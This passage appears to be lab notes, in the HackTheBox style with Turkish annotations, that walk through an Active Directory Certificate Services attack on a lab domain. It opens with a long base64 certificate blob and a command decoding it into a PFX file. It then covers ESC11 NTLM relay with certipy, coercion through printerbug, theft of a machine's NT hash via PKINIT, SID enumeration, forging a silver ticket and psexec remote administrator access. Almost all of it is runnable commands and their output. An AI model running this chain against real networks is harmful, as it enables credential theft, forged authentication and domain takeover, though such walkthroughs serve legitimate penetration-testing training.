TW7tvqSTR5wj7q6TdJRldFy+jJ1MaEkn1NSu6cVquZDft3XR/YVbkKSsOsKeTHqhkfQIaYRMkr8tKIr0KtcysM05xWt/yge+bFD4ipGL23DCsLUr7tEwDcgHpTk+hq4ulEuqV21gtH8PQGbMNSFBE423S25SbZ9kk+mP2ukkBaseflvWcb/qzOKV/cIgKTBF/q0HxscmH8ANHHFqVctjg/3uAstYo9YCX2n9mUhmZebFaWGXaJ1rRgNpdQ9ltCbH6zRUTFDhpurgzOtO5pHS2Vcf+LVoLM1Wf8/nudQ5Dsp2YsqXfuVZgda35Su7WuArqF99j1GKBHRt8uuPtLRFDXi++Vph93zHvWHuzToQcDAsek75pVqQnheXMgBIVwQxyi1OCdgnnEUxzp1JXh34rSZswc0JIVDNoYXJ04xlReXuBxYwvF7RKwdnYSa4Ed6aRXtxp5dCVGeqzyxBZv3Fb5XmNAUAQl1KKjHzQBe3tD4e9OdxG20ACnre2Ps3bC/S/bdB7Ps36sFijUF8b/I7X2RpXSj5TIpX+PSXJuZy0NkdKUhpm5HiFHNG1Pa3qv/ufMDv1Mf4mo5JVt78yZss7ExM8WjQjsghdEfW2ZC3tXZq1PWDnQh8YAKJDrF6971RhOaHkWBvs5OxwdJRvEB7hvl6h6+ATZMNx9Gbk5vVM6vHm/WjTSpkDED98ecwJRX3WxpeGuj2OcaBQ9WvrxecvPGBH4eelHoGwFJvz6uaeJpfAx5khzeXNODTA4TwrLTsJ2y3Cp7GU52bhvKsfsBzV9r6+JwpRsG82TcWUriHviw5lrE8bDftxS9yaim+cl96dpZfbpHCkPSUlu+KbLY/2dvyyK6P2TqqtQhq02Qkwzb/5DPRlKYrnWeldd+htGLti1DpAMHQNbI63ei1Ws23GQTmuWl4+Izy4YB1b+XDm//bNcRfgy3G06IkR3r5zKgTWFfzulcW4w7nmX+u8JH9RsQqcuRzgWtomabEPaQNWlgf6MX6kJTOolkGPOQ8sZgN2uXSGfumezUJg3bi48zB1vLiy8Hpjyrtaisz45Ub5zRsRx5uxELvce1YWr0rPYKV5YKLB+FyV3oX1VW4debD7uaHi2mFISJEV35YCe5PFQX2niMTOU/mJ1PZgh8RzvMTXuoFpxey7vanJrFT0YLW5XTlkshnjOOyyswA/bqaRaukWTy0YsWwMNN2Y4b8fn2QnSKotqClaQWQPrD+RvWXfRTi9L2KHaRK7rHTcAV0O+LX7gxAfFhQUYcSkVplJaiCERbJsKB4rL47EqZsTHLcMWNSpoaoxSt27e7VRSvvuohjaEcO8io++Ugi/swbUmJ8o7eZv5zJqvu5rKwc+0qm0Buw4OaACmV5ffIbV9THqvvc2jwOMSoRJlT2nqx/9DwUhBAI+eo9RVPXl4K66PtQkYEepX6m8hlBMTa3HQt1vBEUmxwfzOiCHotTT+tiQKRcYAfogBNncIh3GqJYrFZhBgsVPpvGsIDDcmRliR/lXav+ZhJuc/Ho6NKOJglKMNXueId4yo5AQtDWNdrmTjT6jvMNDBFMMVkMFqEQNYOOLquK0kQB79PGFQydvgnnYXvR5ddTElMCMGCSqGSIb3DQEJFTEWBBTcpaxamobokp7gq4EhEePhhcrKfzA9MDEwDQYJYIZIAWUDBAIBBQAEIPEUmiKWxiVrMyLnWiK9Z6Q0hQ84hflqDrlFd29SrAg9BAhld16uHDCMSQ==
```

### Decoding the Certificate

```sh
htb-student@ubuntu:~$ echo -n MIIRPQIBAzCCEPcGCSqGSIb3DQEHAaCCEOgEghDkMIIQ4DCCBxcGCSqGSIb3DQEHBqCCBwgwggcEAgEAMIIG/QYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQIdMFizoihEcMCAggAgIIG0JGMkixeTVXpdUVVvd8+8VUewSpqT32iKHjbmG181C62w1J6nyqHbVSE2nEA797p7c6D5ZlGqDUvxk9PQ/ICIsEjO/g5V11oC6hg6qwlxGtJWQPijj5vmavVtksFTR2h2GdQ7Mpdyyc8TsgfsLTslBL18d+yMgGXTNxAXKDJ6swbHTLPUW2Fhfh7AwJvIyBxCYb5FdRGq4c5VFJOT1WJ8UyRzrf6x7uiIqXkKV2P9qsihyfMaf79py3//Rj6qI6uDC60xmTj1iqFQ2ggxLX9dQM66Q/FLY96x1hGjVjlx+/9uX1ai7bBCBX6qhQ71QCopoRQubDo9bdR+Msp5HDJBtKamgpIWqGGaAUz24bkwi7o/DakKz1BEcAkzLW0TDCpZxY7fFOkGR2ECKoVjuyuTzKjqLrYinQo7AZbiv4M6w0mXZlV0k0moCEk+EL+6YEzZuD4yvRkA4lTTbed4hlz2E385hYr8Mlcc+jfjp/w5ptXe149h74GTaBsKpTwexudFf3WewIahlbvGw0iYzTJTcbOZVq3tnoiODkjJWDZ/R7Je+nCqbqEqx3hW6UkYyYpK2LLsiDwNaDUAIjM/cRtVFVUPo6FzyITheUqfXcm8pJrP16cWUr+pLlAaMW1gNX3FN+HqJnTBybuHSFGc+gzNa93CjGUoYHPzvhIEu+jRBa54vyxRiIDosy/xa6sRCzfhTK949eBtfRYx+jICDssgU9J6RnW4J7rsG7HolUafbiidDC5FPDWAADf9XBtUORqR7RtdZqMLosmBEEHCFv+mjN2TzPReqLkywwzTlXfAMUMzk1YByhKpe8qu1LbnOVWcieVpxnNfwsMk2WNvsxL67PQzgkFX71+RtRzwYUiL125YEdtFFdcz9y3nSzCf4qDUusPjPTaZ3MRtILc3aPy5CV0RyfhfqkPNUuzPAFd5YIc86GUV/qfLhfqeDq3LP+1f202e07Veageu64wO9YVtlVObb87kJKW8O4sgi5cvI4hBYPYLy/acTCsKnsc4H3PNnhjCVNunSVWqAK89im+6NLx/jETfpilGMHF/BGwk2jlB7qdFAFsNwQqAzyYyI32RSUQ99vFwjKB6zvkN4IjL6L1ueVezmsPh1voHT6I1sy7jxzMKoNibwZ5sQpEaAioT2WQYp5GxcGe9ak/f9K8M5AhO9CtMOefPhLIgANNQ2X7foAPbri57DMdXABHRY5pOyBeMBLpYhbp07T9rhedgjgprn+V6hrqrr8tIrT7XdYBjEbpIhetPzLWitDY6VfI1f+CjIZQt2g1m/qcWLGqOgOqexsbjyjQ6Zh2XMV7T+agtRrdofcjrwBrwnsJRRgxrhhSmLjEBCUW6z9qnqPJzYIVNMXUifUmRDukQwwud1B0UI2dqSQYtadd87m2RZaUGe7T86/1K8si6iwgLpaHkvgRpi8MfuXJDqdoe52QldyyHa3EQ8ClizKb6aaCq6PGq/oPrlbMhbK1/bqCzZ0bpHO0lP30wJBFPkiFSOxGzF4UI/bbuxUnslQgDYq2LlWGCgdiT24/4BFpmL9lEodXeIdBM4LSBkzPLTDtmproJVJQp1iJwyvxUTY+mJnXO80ZBx4qTYw/qRc3JYRsOqPwokkHFYD9JJkxHv5rhxb2BZMWB0P6fuUpLlKTnXMVtDkrkS4fuNYf2BBEoOe3vD66Wea90+qwWM68PrN7LXiplxKalvTcRiivCIgErULL6JMu+KhtJ54pDuJBBpyxSSiKrCK3Br5ikWgLk2Ru1IqYZBMZuzMC0er5ATn6+Zmrqby7f/woMgEQtKHxGCYtbuSOVtZLUQ3O1xbJCbwv5AEfuDaHpjEs+EcbXd1tDz8TWcBk8J/Kio8000SdGXAMPYzzQOKK4zVZR8yGoT4Y1jX8GI483wmkzSUs0dgROONqpm7u+02DagJ9jUiJ4dli8yog/Ur6Plw2zdd4ps9jbU1ei9GC8uTy55NRqxNNfvqMnkGV+eD7qgVzyJQGGqLpz5NKsn3mSYrAF3TA/UqZF2XNKfwFBOm1vJryCko3uQEW9ZhXotfKyK15msDnxxc3T+Qmv4MctabLc1GjuJPNJmExjauGBwz7Kwy8Jr3y236txHAKLbSCOpWeARa7kamgZE7gu8SwG/FVHdpqwZ30jkoVP4HYghAa8LKw55oylc3xht90RTD7d4HtvmblEsLPFWMLFmbQ5A6V0NcHZAsueFSiYyrl7lDXcTL41ZJGQMvP6pSVB6wDy+WeU4c5pzv9lkgw7N86d5w3PJHX77f79tPpu+iZHfcjdGS9m9hV1hgOjstsoQjoXmdjfdnkul+s3kFUoYEwggnBBgkqhkiG9w0BBwGgggmyBIIJrjCCCaowggmmBgsqhkiG9w0BDAoBAqCCCW4wgglqMBwGCiqGSIb3DQEMAQMwDgQI6YrC5sRlYo4CAggABIIJSAhrPt8b0YttsC3LzaW8vEgNCrb0eKVi9hg9G0NG50nU34DPU0BiQCJpvtL9rocvKQvPU2j1zvc/TJ6uSX2vPcDB7cMQYpPVJygdj/4fHy2w5IWitMki3uw4PVC4Qrwj9k2GaSI7EtNQKPmR64JNp0FXifJH2p1Mj+8oVe6sajdnmx6inr2qcE6uZd3AV1d0FFo2BdC2kmI+DUiB75/4DybdImQPtsk7ZBCpNwefJDQ3LpSAA491Ni1ZHNq1GbIY8uaPOVlhPO2uefcPRz8MJ2Wi0SuljbpDjLxVqWo9lNBcbFhFaOFwGf7AXypmvbVt09hDdAnpv0RlpCbjV5g/GZIQWLKaNJC1QTXCmsIBy9M/1VpnZixwh7LySw5TeNV6BHktiS2VpAIIlg3HnDKyFyItUcnUon2Lwuuy90XN+Wl1J0zMuLA82RLNm4KwBDoN9iDpG8VgrGSIP4t/SnKnpBW0phl3CyLX4PElSdeI/yi09nP8YaVDAvCsMNbNlooLKwBGc5LZpt8nharmEF6LIM3E4KKvqOlsJvNuIvgiHYQBk/CO1uJe2LeFuFs0IOsgwK85PR44IJvXRULlc4yEIHYKkOnuDkBGk/JvuOjxxMXQRApfUKXTBKzNw5a74J8YfaYP1f4+ubSTOONNIFB2bJj45ZU6sZtUvp6bP2vSlIHSpM2WpjaFVF/KBtYCnX2i0zgdDTd6ZMDHIjtPrJE1TAQRtTqqK+jYr4gU2+ZWi3+rmmPxhBAgWW1qbpONQYTJUWhJWJyTt7LiuZmFTNS5OUlfEOIL8aKBPu+K/3ED15bKyyJqzMSB2FLVmnt1dVw2u4GsG7JiWvL47ziBCLB93fspbxn3UgI2ufouPdvTgfGF4ffXOdZ/TsRgYUcONz0Ei8hRvYqRW81pSieVyIpJ1wJU/eptxJ02vT4eTYp9eX426uF9/YEF/0UMohAVGNbUxZMD5hgEeh1qEYTjU73YhJUP6oho34MgCyCgtDsWSLqIZSXfIpXh9H+8Ga0lfK4qxN3XvhP7f9GpmFDKCclqTDU0wsSadpqeVSfSdnzasCxCNPnETeGbz3meyjyMs5fa+KbLRf8N+UFwGFGUeXaw8BP5kIcWqE+8EAeI7qigrhf2t+I4wvb0gsaoW+1OtfANcVGDZ1sCjEppntVpdjCCFEkqkUSpp/nHztqGYoAYdjXn/6AIeaNUVHmXgR2ZPaH/p1PaU446XPiMIV56TUBNFYV1UMmV8y/jgvIjo3gbkCBMPRIAdsEQ+fRY7l6MYIwnYB8UfqxxvPdsCMBAW+G5Z1NeWMvzgMO0h/3dPWlFKXtcPGWNGnWzoBmeGT/PYo1px2h+dTrDsyD+y6I4WcfhwVdVhp9y/1MW2kXsXPvbfEl2b6Vzh12owSHFQf+BYTg6vNZLhLYhXKrwX9w+25DpPCCSrkT27QMmkUerR+SwvTdrA9uOwo6hTUc96iQLqAQ5rw9F9rQvDkemfKrqSn1RX7p2eNB03KygrkuNIZEHgN45DI336YYWo+DbQs38WFKtutHSGz//JCWZ1S33RCVlowTEwe3TKDTW7tvqSTR5wj7q6TdJRldFy+jJ1MaEkn1NSu6cVquZDft3XR/YVbkKSsOsKeTHqhkfQIaYRMkr8tKIr0KtcysM05xWt/yge+bFD4ipGL23DCsLUr7tEwDcgHpTk+hq4ulEuqV21gtH8PQGbMNSFBE423S25SbZ9kk+mP2ukkBaseflvWcb/qzOKV/cIgKTBF/q0HxscmH8ANHHFqVctjg/3uAstYo9YCX2n9mUhmZebFaWGXaJ1rRgNpdQ9ltCbH6zRUTFDhpurgzOtO5pHS2Vcf+LVoLM1Wf8/nudQ5Dsp2YsqXfuVZgda35Su7WuArqF99j1GKBHRt8uuPtLRFDXi++Vph93zHvWHuzToQcDAsek75pVqQnheXMgBIVwQxyi1OCdgnnEUxzp1JXh34rSZswc0JIVDNoYXJ04xlReXuBxYwvF7RKwdnYSa4Ed6aRXtxp5dCVGeqzyxBZv3Fb5XmNAUAQl1KKjHzQBe3tD4e9OdxG20ACnre2Ps3bC/S/bdB7Ps36sFijUF8b/I7X2RpXSj5TIpX+PSXJuZy0NkdKUhpm5HiFHNG1Pa3qv/ufMDv1Mf4mo5JVt78yZss7ExM8WjQjsghdEfW2ZC3tXZq1PWDnQh8YAKJDrF6971RhOaHkWBvs5OxwdJRvEB7hvl6h6+ATZMNx9Gbk5vVM6vHm/WjTSpkDED98ecwJRX3WxpeGuj2OcaBQ9WvrxecvPGBH4eelHoGwFJvz6uaeJpfAx5khzeXNODTA4TwrLTsJ2y3Cp7GU52bhvKsfsBzV9r6+JwpRsG82TcWUriHviw5lrE8bDftxS9yaim+cl96dpZfbpHCkPSUlu+KbLY/2dvyyK6P2TqqtQhq02Qkwzb/5DPRlKYrnWeldd+htGLti1DpAMHQNbI63ei1Ws23GQTmuWl4+Izy4YB1b+XDm//bNcRfgy3G06IkR3r5zKgTWFfzulcW4w7nmX+u8JH9RsQqcuRzgWtomabEPaQNWlgf6MX6kJTOolkGPOQ8sZgN2uXSGfumezUJg3bi48zB1vLiy8Hpjyrtaisz45Ub5zRsRx5uxELvce1YWr0rPYKV5YKLB+FyV3oX1VW4debD7uaHi2mFISJEV35YCe5PFQX2niMTOU/mJ1PZgh8RzvMTXuoFpxey7vanJrFT0YLW5XTlkshnjOOyyswA/bqaRaukWTy0YsWwMNN2Y4b8fn2QnSKotqClaQWQPrD+RvWXfRTi9L2KHaRK7rHTcAV0O+LX7gxAfFhQUYcSkVplJaiCERbJsKB4rL47EqZsTHLcMWNSpoaoxSt27e7VRSvvuohjaEcO8io++Ugi/swbUmJ8o7eZv5zJqvu5rKwc+0qm0Buw4OaACmV5ffIbV9THqvvc2jwOMSoRJlT2nqx/9DwUhBAI+eo9RVPXl4K66PtQkYEepX6m8hlBMTa3HQt1vBEUmxwfzOiCHotTT+tiQKRcYAfogBNncIh3GqJYrFZhBgsVPpvGsIDDcmRliR/lXav+ZhJuc/Ho6NKOJglKMNXueId4yo5AQtDWNdrmTjT6jvMNDBFMMVkMFqEQNYOOLquK0kQB79PGFQydvgnnYXvR5ddTElMCMGCSqGSIb3DQEJFTEWBBTcpaxamobokp7gq4EhEePhhcrKfzA9MDEwDQYJYIZIAWUDBAIBBQAEIPEUmiKWxiVrMyLnWiK9Z6Q0hQ84hflqDrlFd29SrAg9BAhld16uHDCMSQ== | base64 -d > WS01.pfx
```

## [ESC11](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/) (Relaying NTLM to ICPR)

### Getting Certipy Ready

```sh
htb-student@ubuntu:~$ sudo certipy relay -target rpc://172.16.117.3 -ca "INLANEFREIGHT-DC01-CA" -template Machine
```

### PrinterBug

| TARGET | ATTACK MACHINE |
|---|---|
| 172.16.117.50 | 172.16.117.30 |

```sh
htb-student@ubuntu:~$ printerbug.py 'INLANEFREIGHT'/'plaintext$':'Password123!'@172.16.117.50 172.16.117.30
```

```output title="Output" hl_lines="4-5"
[*] Attempting to trigger authentication via rprn RPC at 172.16.117.50
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Triggered RPC backconnect, this may or may not have worked
```

### Certipy Results

!!! success

    Zorla başlatılan SMB kimlik doğrulaması ICPR üzerinden aktarıldı ve sertifika elde edildi.

```sh
htb-student@ubuntu:~$ sudo certipy relay -target rpc://172.16.117.3 -ca "INLANEFREIGHT-DC01-CA" -template Machine
```

```output title="Output" hl_lines="11"
[*] Targeting rpc://172.16.117.3 (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:172.16.117.3[135] to determine ICPR stringbinding
[*] Attacking user 'WS01$@INLANEFREIGHT'
[*] Requesting certificate for user 'WS01$' with template 'Machine'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 21
[*] Got certificate with DNS Host Name 'WS01.INLANEFREIGHT.LOCAL'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'ws01.pfx'
[*] Exiting...
```

## Requesting TGT and Retrieving NT Hash

### Certipy

```sh
htb-student@ubuntu:~$ certipy auth -dc-ip 172.16.117.3 -pfx ws01.pfx
```

```output title="Output" hl_lines="4 6"
[*] Using principal: ws01$@inlanefreight.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ws01.ccache'
[*] Trying to retrieve NT hash for 'ws01$'
[*] Got hash for 'ws01$@inlanefreight.local': aad3b435b51404eeaad3b435b51404ee:d172f136edc2366d2aa411e92ab6ca01
```

### [PKINITtools](https://github.com/dirkjanm/PKINITtools)

#### TGT + AS-REP Key

!!! success

    * TGT talep edildi.
    * AS-REP anahtarı öğrenildi.

```sh
htb-student@ubuntu:~$ python3 PKINITtools/gettgtpkinit.py -dc-ip 172.16.117.3 'INLANEFREIGHT.LOCAL'/'WS01$' -cert-pfx WS01.pfx WS01.ccache
```

```output title="Output" hl_lines="8 10"
2025-02-02 22:58:31,123 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-02-02 22:58:31,661 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-02-02 22:58:41,538 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-02-02 22:58:41,539 minikerberos INFO     c72b120c49205a4620da03ee2f96a1064c1045463a81b3a767201dff917a6903
INFO:minikerberos:c72b120c49205a4620da03ee2f96a1064c1045463a81b3a767201dff917a6903
2025-02-02 22:58:41,544 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

#### NT Hash

!!! success

    * TGS bileti talep edildi.
    * AS-REP anahtarı kullanılarak PAC içerisinden NT hash çıkarıldı.

```sh
htb-student@ubuntu:~$ KRB5CCNAME='WS01.ccache' python3 PKINITtools/getnthash.py 'INLANEFREIGHT.LOCAL'/'WS01$' -key C72B120C49205A4620DA03EE2F96A1064C1045463A81B3A767201DFF917A6903
```

```output title="Output" hl_lines="4"
[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
d172f136edc2366d2aa411e92ab6ca01
```

## Concluding

### Retrieving Domain SID

```sh
htb-student@ubuntu~$ lookupsid.py 'INLANEFREIGHT.LOCAL'/'WS01$'@172.16.117.3 -hashes :D172F136EDC2366D2AA411E92AB6CA01
```

```output title="Output" hl_lines="3"
[*] Brute forcing SIDs at 172.16.117.3
[*] StringBinding ncacn_np:172.16.117.3[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1207890233-375443991-2397730614
498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: INLANEFREIGHT\Administrator (SidTypeUser)
501: INLANEFREIGHT\Guest (SidTypeUser)
502: INLANEFREIGHT\krbtgt (SidTypeUser)
512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
513: INLANEFREIGHT\Domain Users (SidTypeGroup)
514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
520: INLANEFREIGHT\Group Policy Creator Owners (SidTypeGroup)
521: INLANEFREIGHT\Read-only Domain Controllers (SidTypeGroup)
522: INLANEFREIGHT\Cloneable Domain Controllers (SidTypeGroup)
525: INLANEFREIGHT\Protected Users (SidTypeGroup)
526: INLANEFREIGHT\Key Admins (SidTypeGroup)
527: INLANEFREIGHT\Enterprise Key Admins (SidTypeGroup)
553: INLANEFREIGHT\RAS and IAS Servers (SidTypeAlias)
571: INLANEFREIGHT\Allowed RODC Password Replication Group (SidTypeAlias)
572: INLANEFREIGHT\Denied RODC Password Replication Group (SidTypeAlias)
1002: INLANEFREIGHT\DC01$ (SidTypeUser)
1103: INLANEFREIGHT\DnsAdmins (SidTypeAlias)
1104: INLANEFREIGHT\DnsUpdateProxy (SidTypeGroup)
1105: INLANEFREIGHT\SQL01$ (SidTypeUser)
1106: INLANEFREIGHT\ILF-XRG$ (SidTypeUser)
1107: INLANEFREIGHT\MAINLON$ (SidTypeUser)
1108: INLANEFREIGHT\CISERVER$ (SidTypeUser)
1109: INLANEFREIGHT\INDEX-DEV-LON$ (SidTypeUser)
1110: INLANEFREIGHT\SQL-0253$ (SidTypeUser)
1111: INLANEFREIGHT\NYC-0615$ (SidTypeUser)
1112: INLANEFREIGHT\NYC-0616$ (SidTypeUser)
1113: INLANEFREIGHT\NYC-0617$ (SidTypeUser)
1114: INLANEFREIGHT\Contractors (SidTypeGroup)
1115: INLANEFREIGHT\Accounting (SidTypeGroup)
1116: INLANEFREIGHT\Engineering (SidTypeGroup)
1117: INLANEFREIGHT\Executives (SidTypeGroup)
1118: INLANEFREIGHT\Human Resources (SidTypeGroup)
1119: INLANEFREIGHT\Marketing (SidTypeGroup)
1120: INLANEFREIGHT\Operations (SidTypeGroup)
1121: INLANEFREIGHT\Project Management (SidTypeGroup)
1122: INLANEFREIGHT\Sales (SidTypeGroup)
1123: INLANEFREIGHT\TechSupport (SidTypeGroup)
1124: INLANEFREIGHT\IT Admins (SidTypeGroup)
1125: INLANEFREIGHT\Developers (SidTypeGroup)
1126: INLANEFREIGHT\Network Admins (SidTypeGroup)
1127: INLANEFREIGHT\avazquez (SidTypeUser)
1128: INLANEFREIGHT\pfalcon (SidTypeUser)
1129: INLANEFREIGHT\fanthony (SidTypeUser)
1130: INLANEFREIGHT\wdillard (SidTypeUser)
1131: INLANEFREIGHT\lbradford (SidTypeUser)
1132: INLANEFREIGHT\sgage (SidTypeUser)
1133: INLANEFREIGHT\asanchez (SidTypeUser)
1134: INLANEFREIGHT\dbranch (SidTypeUser)
1135: INLANEFREIGHT\ccruz (SidTypeUser)
1136: INLANEFREIGHT\njohnson (SidTypeUser)
1137: INLANEFREIGHT\mholliday (SidTypeUser)
1138: INLANEFREIGHT\mshoemaker (SidTypeUser)
1139: INLANEFREIGHT\aslater (SidTypeUser)
1140: INLANEFREIGHT\kprentiss (SidTypeUser)
1141: INLANEFREIGHT\gdavis (SidTypeUser)
1142: INLANEFREIGHT\jmcdaniel (SidTypeUser)
1143: INLANEFREIGHT\jjones (SidTypeUser)
1144: INLANEFREIGHT\tgarcia (SidTypeUser)
1145: INLANEFREIGHT\mharrison (SidTypeUser)
1146: INLANEFREIGHT\sql_svc (SidTypeUser)
1147: INLANEFREIGHT\peter (SidTypeUser)
1148: INLANEFREIGHT\WS01$ (SidTypeUser)
1149: INLANEFREIGHT\rmonty (SidTypeUser)
1150: INLANEFREIGHT\jperez (SidTypeUser)
1151: INLANEFREIGHT\nports (SidTypeUser)
1152: INLANEFREIGHT\mkarks (SidTypeUser)
1153: INLANEFREIGHT\SQL Admins (SidTypeGroup)
1154: INLANEFREIGHT\mkam (SidTypeUser)
1157: INLANEFREIGHT\cjaq (SidTypeUser)
1158: INLANEFREIGHT\dperez (SidTypeUser)
1159: INLANEFREIGHT\cmatos (SidTypeUser)
1160: INLANEFREIGHT\prototypeproject (SidTypeUser)
1161: INLANEFREIGHT\rons (SidTypeUser)
```

### Forging the Silver Ticket (TGS Ticket)

```sh
htb-student@ubuntu:~$ ticketer.py Administrator -nthash D172F136EDC2366D2AA411E92AB6CA01 -domain INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-1207890233-375443991-2397730614 -spn cifs/WS01.INLANEFREIGHT.LOCAL
```

```output title="Output" hl_lines="12"
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for INLANEFREIGHT.LOCAL/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

### Remote Access

```sh
htb-student@ubuntu:~$ export KRB5CCNAME='Administrator.ccache'
htb-student@ubuntu:~$ psexec.py 'INLANEFREIGHT.LOCAL'/'Administrator'@WS01.INLANEFREIGHT.LOCAL -k -no-pass
```
